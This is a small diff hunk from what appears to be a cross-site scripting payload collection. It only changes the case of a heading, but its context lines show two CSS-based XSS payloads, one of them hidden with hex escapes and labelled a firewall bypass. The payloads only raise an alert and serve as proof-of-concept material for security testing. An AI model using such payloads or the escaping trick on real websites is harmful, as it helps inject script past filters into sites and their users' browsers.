@@ -65,6 +65,6 @@ Xss using css:
 <style>img{background-image:url(‘javascript:alert(1)’)}</style>
 
 
-firewall bypass:
+FIREWALL BYPASS :
 
 <style>*{background-image:url(‘\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29’)}</style>
